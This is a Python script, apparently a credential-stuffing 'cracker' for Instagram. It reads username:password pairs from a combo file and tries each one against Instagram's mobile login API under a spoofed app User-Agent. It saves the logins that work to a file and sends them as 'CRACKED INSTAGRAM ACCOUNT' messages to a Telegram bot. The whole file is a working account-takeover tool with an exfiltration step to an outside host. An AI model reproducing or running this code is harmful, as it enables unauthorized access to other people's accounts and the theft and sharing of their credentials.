import os
import sys
import requests
import time
from time import sleep

os.system("clear")

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    os.system('clear')
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    os.system('clear')
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    os.system('clear')
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    os.system('clear')

def close():
    input('- Press Enter To Exit /')
    sys.exit()


#COLORS
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PINK = '\033[95m'
LIGHT_BLUE = '\033[96m'
GRAY = '\033[90m'
#COLORS

logo = ("""
                                             
                                             
                                             
                                             
"""+RED+"""O~~          O~~~~     O~~~~~~~    O~~~~~    
"""+GREEN+"""O~~        O~~    O~~  O~~    O~~  O~~   O~~ 
"""+YELLOW+"""O~~      O~~        O~~O~~    O~~  O~~    O~~
"""+BLUE+"""O~~      O~~        O~~O~ O~~      O~~    O~~
"""+PINK+"""O~~      O~~        O~~O~~  O~~    O~~    O~~
"""+LIGHT_BLUE+"""O~~        O~~     O~~ O~~    O~~  O~~   O~~ 
"""+GRAY+"""O~~~~~~~~    O~~~~     O~~      O~~O~~~~~    
                                             
                                             
  \033[92mAUTHOR >>> YOUNG BLADE
  
  \033[91mWHATSAAP>>> 2347063648008
  
  \033[96mINSTAGRAM>>> YOUNG_BLADE111
""")
print(logo)
print("")
print("\n\033[90m [X] WELCOME TO THE YOUNG'S  ")

def bottele():
    tele = input(RED+"""
      [+] you want to send your telegram bot ? Y/N ?: """)
    os.system('clear')
    if "Y" in tele or  'y' in tele:
        id=input(GREEN+"""
          [+] ENTER YOUR ID TELEGRAM > """)
        bot=input(GREEN+"""
          [+] ENTER YOUR TOKEN_BOT TELEGRAM > """)
    elif 'N' in tele or 'n' in tele:
        pass
    else:
            print('\n\n')
            print(RED+'''
              >>>> YOUR OPTION IS WRONG''')
            bottele()

    
    os.system('clear')
    h, b, = 0,0
    print(logo)
    combo = input("[+] Enter Combo File Name : ")
    if '.txt' in combo:
        pass
    else:
        combo  = combo + '.txt'
    os.system('clear')
   
    print("")
    print(f"\r\n\033[92m   [+]GOOD\033[97m:\033[92m{h}|\033[91m[-]NOT\033[97m:\033[91m{b}",end='')
    acc = open(combo,"r").read().splitlines()
    for combo in acc:
        ur = combo.split(":")[0]
        ps = combo.split(":")[1]
        req = requests.session()
        
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {
            'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
            'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
            'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
            'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        req = requests.Session()
        uid = str(uuid4())
        data = {
        'uuid': uid,
        'password': ps,
        'username': ur,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'}
        
        req = requests.session()
        RX = req.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
 
        #print(RX.text)
        
        if "logged_in_user" in RX.json():
            h += 1
            print(f"\r\033[92m   [+] GOOD \033[97m: \033[92m{h} | \033[91m [-] NOT \033[97m: \033[91m{b}",end='')
            print(' ')
            print("\n\033[90m    TESTING \033[97m>> ",'{ '+f"\033[92m{ur}"+" \033[91m: "+f"\033[92m{ps}"+' \033[91m}'," \033[91m<<\n")
            print("""\033[92m
   ____ ____      _    ____ _  _______ ____  
  /4___|1 _ \    /O\  /4___|0|/4/4____|  _ \ 
 |O|   |1|0) |  /6_9\| |---| ' /|  _| | |0| |
 |O|___|  _ <  / ___ \ |___| . \| |___| |6| |
  \____|_| \_\/_/   \_\____|_|\_\_____|____/ 
                                             
            """)
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= CRACKED INSTAGRAM ACCOUNT 𖡌 \n≠≠≠≠≠≠≠≠≠≠≠≠ Xnot ≠≠≠≠≠≠≠≠≠≠≠≠\n> USER > {ur} \n> PASS > {ps}\n≠≠≠≠≠≠≠≠≠≠≠≠ Xnot ≠≠≠≠≠≠≠≠≠≠≠≠\nTelegram > @xXx_not_found_xXx ")
         
            open("GOOD-INSTAGRAM.txt","a").write(f"{ur}:{ps}\n")
            
        else:
            
            b += 1
            
            print(f"\r\033[92m   [+] GOOD \033[97m: \033[92m{h} | \033[91m [-] NOT \033[97m: \033[91m{b}",end='')
            print(' ')
            print("\n\033[90m    TESTING \033[97m>> ",'{ '+f"\033[91m{ur}"+" \033[91m: "+f"\033[91m{ps}"+' \033[91m}'," \033[91m<<\n")
bottele()
            
            
            
            
            
            
